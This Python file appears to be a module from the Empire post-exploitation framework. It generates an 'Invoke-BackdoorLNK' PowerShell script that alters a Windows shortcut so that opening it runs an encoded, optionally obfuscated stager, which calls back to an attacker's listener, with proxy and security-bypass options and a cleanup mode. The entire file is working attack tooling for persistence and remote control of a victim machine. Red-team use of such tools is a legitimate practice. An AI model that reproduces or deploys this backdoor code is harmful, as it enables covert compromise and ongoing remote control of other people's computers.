import os
from typing import Dict

from empire.server.common import helpers
from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module:
    @staticmethod
    def generate(
        main_menu,
        module: EmpireModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # management options
        lnk_path = params["LNKPath"]
        ext_file = params["ExtFile"]
        cleanup = params["Cleanup"]

        # storage options
        reg_path = params["RegPath"]

        # staging options
        listener_name = params["Listener"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        if (params["Obfuscate"]).lower() == "true":
            launcher_obfuscate = True
        else:
            launcher_obfuscate = False
        launcher_obfuscate_command = params["ObfuscateCommand"]

        status_msg = ""

        if not main_menu.listeners.is_listener_valid(listener_name):
            # not a valid listener, return nothing for the script
            return handle_error_message("[!] Invalid listener: " + listener_name)

        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher(
                listenerName=listener_name,
                language="powershell",
                encode=False,
                obfuscate=launcher_obfuscate,
                obfuscation_command=launcher_obfuscate_command,
                userAgent=user_agent,
                proxy=proxy,
                proxyCreds=proxy_creds,
                bypasses=params["Bypasses"],
            )
            launcher = launcher.replace("$", "`$")

        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        script_end = "Invoke-BackdoorLNK "

        if cleanup.lower() == "true":
            script_end += " -CleanUp"
            script_end += " -LNKPath '%s'" % (lnk_path)
            script_end += " -RegPath '%s'" % (reg_path)
            script_end += "; \"Invoke-BackdoorLNK cleanup run on lnk path '{}' and regPath {}\"".format(
                lnk_path, reg_path
            )

        else:
            if ext_file != "":
                # read in an external file as the payload and build a
                #   base64 encoded version as encScript
                if os.path.exists(ext_file):
                    with open(ext_file) as f:
                        file_data = f.read()

                    # unicode-base64 encode the script for -enc launching
                    encScript = helpers.enc_powershell(file_data)
                    status_msg += "using external file " + ext_file

                else:
                    return handle_error_message("[!] File does not exist: " + ext_file)

            else:
                # if an external file isn't specified, use a listener
                if not main_menu.listeners.is_listener_valid(listener_name):
                    # not a valid listener, return nothing for the script
                    return handle_error_message(
                        "[!] Invalid listener: " + listener_name
                    )

                else:
                    # generate the PowerShell one-liner with all of the proper options set
                    launcher = main_menu.stagers.generate_launcher(
                        listenerName=listener_name,
                        language="powershell",
                        encode=True,
                        obfuscate=launcher_obfuscate,
                        obfuscation_command=launcher_obfuscate_command,
                        userAgent=user_agent,
                        proxy=proxy,
                        proxyCreds=proxy_creds,
                        bypasses=params["Bypasses"],
                    )

                    encScript = launcher.split(" ")[-1]
                    status_msg += "using listener " + listener_name

            script_end += " -LNKPath '%s'" % (lnk_path)
            script_end += " -EncScript '%s'" % (encScript)
            script_end += "; \"Invoke-BackdoorLNK run on path '{}' with stager for listener '{}'\"".format(
                lnk_path, listener_name
            )

        script = main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
        return script
